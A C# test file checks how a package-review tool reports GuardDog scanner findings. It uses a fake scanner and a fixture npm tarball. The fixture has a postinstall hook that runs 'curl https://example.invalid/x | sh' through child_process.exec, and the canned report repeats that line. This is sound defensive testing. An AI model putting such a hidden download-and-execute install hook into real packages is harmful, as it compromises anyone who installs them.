using System.Formats.Tar;
using System.IO.Compression;
using System.Text;
using Corvus.Services.Web.Packages;

namespace Corvus.Tests;

/// <summary>GuardDog rule matches in the package review, run through a scripted guarddog.</summary>
[Collection(ExternalToolEnvironmentCollection.Name)]
public sealed class GuardDogRulesTests : IDisposable
{
    private readonly TempDir _dir = new();

    public void Dispose() => _dir.Dispose();

    // GuardDog 3.2.0's report for the package Package() builds, rules without a match trimmed.
    private const string Report = """
        {"package": "helper.tgz", "results": {"capability-filesystem-read": {},
          "capability-network-lolbas": [{"location": "package/setup.js:1", "code": "require(\"child_process\").exec(\"curl https://example.invalid/x | sh\");", "match": "curl https://", "message": "lolbas_net rule matched"}],
          "capability-process-hooks": [{"location": "package/package.json:1", "code": "{}", "match": "\"postinstall\":\"node setup.js", "message": "has_npm_hook rule matched"}],
          "threat-process-download-exec": [{"location": "package/setup.js:1", "code": "", "match": "exec(\"curl", "message": "Detects download-and-execute patterns: fetching a remote file then executing it"}],
          "threat-network-reverse-shell": {}}, "issues": 3, "errors": {}}
        """;

    private string Package()
    {
        var path = _dir.File("helper-1.0.1.tgz");
        using (var fs = File.Create(path))
        using (var gz = new GZipStream(fs, CompressionLevel.Fastest))
        using (var tar = new TarWriter(gz, TarEntryFormat.Ustar))
            foreach (var (p, text) in new[]
                     {
                         ("package/package.json", """{"name":"example-helper","version":"1.0.1","scripts":{"postinstall":"node setup.js"}}"""),
                         ("package/setup.js", "require(\"child_process\").exec(\"curl https://example.invalid/x | sh\");"),
                     })
                tar.WriteEntry(new UstarTarEntry(TarEntryType.RegularFile, p) { DataStream = new MemoryStream(Encoding.UTF8.GetBytes(text)) });
        return path;
    }

    private static FakeTool GuardDog()
    {
        var fake = new FakeTool();
        fake.On("^--version$", stdout: "3.2.0\n");
        return fake;
    }

    [Fact]
    public void GuardDog_matches_join_the_review_at_file_and_line_with_threat_rules_noteworthy()
    {
        using var fake = GuardDog();
        fake.On(@"^npm scan .+helper-1\.0\.1\.tgz --output-format=json$", stdout: Report);
        using var env = new EnvironmentScope().Set("CORVUS_GUARDDOG", fake.CopyAs("guarddog")).Set(FakeTool.ScriptVariable, fake.ScriptPath);
        var r = PackageReview.Review(Package(), default)!;
        var rules = r.Findings.Where(f => f.Category == "rule match").ToList();
        Assert.Equal(3, rules.Count);
        Assert.Contains(rules, f => f is { Level: "noteworthy", Path: "package/setup.js", Line: 1 } && f.Detail.StartsWith("GuardDog threat-process-download-exec: Detects download-and-execute", StringComparison.Ordinal));
        Assert.Contains(rules, f => f is { Level: "review", Path: "package/package.json", Line: 1 } && f.Detail.EndsWith("(\"postinstall\":\"node setup.js)", StringComparison.Ordinal));
        Assert.Contains("GuardDog 3.2.0: 3 rule match(es)", r.Notes);
    }

    [Fact]
    public void A_guarddog_that_fails_leaves_its_rules_not_checked_with_its_message()
    {
        using var fake = GuardDog();
        fake.On("^npm scan ", stderr: "Traceback (most recent call last):\nsemgrep: command not found", exit: 1);
        using var env = new EnvironmentScope().Set("CORVUS_GUARDDOG", fake.CopyAs("guarddog")).Set(FakeTool.ScriptVariable, fake.ScriptPath);
        var r = PackageReview.Review(Package(), default)!;
        Assert.DoesNotContain(r.Findings, f => f.Category == "rule match");
        Assert.Contains(r.Notes, n => n.StartsWith("GuardDog 3.2.0 rules not checked: its report could not be read", StringComparison.Ordinal) && n.EndsWith("exit 1: semgrep: command not found)", StringComparison.Ordinal));
    }

    [Fact]
    public void A_configured_guarddog_that_is_missing_is_named_and_an_unconfigured_one_adds_nothing()
    {
        using (new EnvironmentScope().Set("CORVUS_GUARDDOG", Path.Combine(_dir.Path, "no-guarddog", "guarddog")))
            Assert.Contains(PackageReview.Review(Package(), default)!.Notes, n => n.StartsWith("GuardDog rules not checked: CORVUS_GUARDDOG is set to", StringComparison.Ordinal));
        using (new EnvironmentScope().Set("CORVUS_GUARDDOG", null))
            Assert.DoesNotContain(PackageReview.Review(Package(), default)!.Notes, n => n.Contains("GuardDog", StringComparison.Ordinal));
    }
}
